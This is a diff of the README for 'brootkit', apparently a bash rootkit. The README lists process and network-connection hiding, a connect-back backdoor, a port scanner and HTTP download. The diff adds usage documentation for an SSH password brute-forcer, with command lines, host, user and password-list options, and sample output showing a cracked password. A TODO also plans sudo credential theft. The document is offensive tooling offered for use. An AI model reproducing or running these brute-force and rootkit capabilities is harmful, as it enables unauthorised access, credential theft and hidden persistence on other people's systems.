@@ -13,8 +13,9 @@
     4. hide process.
     5. hide network connections.
     6. connect backdoor.
-    7. muilt thread port scanner.
+    7. multi thread port scanner.
     8. http download.
+    9. multi thread ssh passwd crack.
 
 ######TARGET OS
     1. centos
@@ -24,7 +25,7 @@
     5. fedroa
     6. freebsd
 
-######TUDO
+######TODO
     1. sudo thief support.
 
 ######INSTALL
@@ -49,7 +50,7 @@
       SLEEP_TIME              60
     2. ./install.sh
 
-    3. muilt thread port scanner.
+    3. multi thread port scanner.
 
       [root@localhost brootkit]$ ./brscan.sh
       ./brscan.sh <-p> [-n|-t|-o|-h] <remote_host>
@@ -82,6 +83,38 @@
       [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]     10/10     6 s
 
     www.wooyun.org: 80
+
+    4. multi thread ssh passwd crack.
+      [root@localhost brootkit]# ./sshcrack.sh
+      ./sshcrack.sh <-h host> <-u user> <-p passwd> [-t timeout] [-n threadnum] [-o logfile]
+
+      option:
+      -h              host name or host list file.
+      -u              user name or user list file.
+      -p              single passwd or passwd list file.
+      -t              connect timeout, defalut is 5s.
+      -n              thread num, default is 1.
+      -o              log file.
+      -v              display help information.
+
+      exp:
+
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h host.lst -u user.lst -p passwd.lst -n 10 -t 2
+
+      [root@localhost brootkit]# ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 6
+      host: 1 | users: 1 | passwd: 28 thread: 6 | timeout: 10 | logfile: sshcrack.log
+
+      Thread[ 1]      wzt@192.168.215.148             ==>     [e               ]      [failed]         3
+      Thread[ 2]      wzt@192.168.215.148             ==>     [a               ]      [failed]         3
+      Thread[ 3]      wzt@192.168.215.148             ==>     [d               ]      [failed]         3
+      Thread[ 4]      wzt@192.168.215.148             ==>     [giveshell       ]      [success]        6
+      Thread[ 5]      wzt@192.168.215.148             ==>     [123456          ]      [failed]         3
+      Thread[ 6]      wzt@192.168.215.148             ==>     [fd              ]      [failed]         3
+
+waiting all threads to finsh...
 
     Freebsd system
     on the modern freebsd system, root use csh by default, the other users
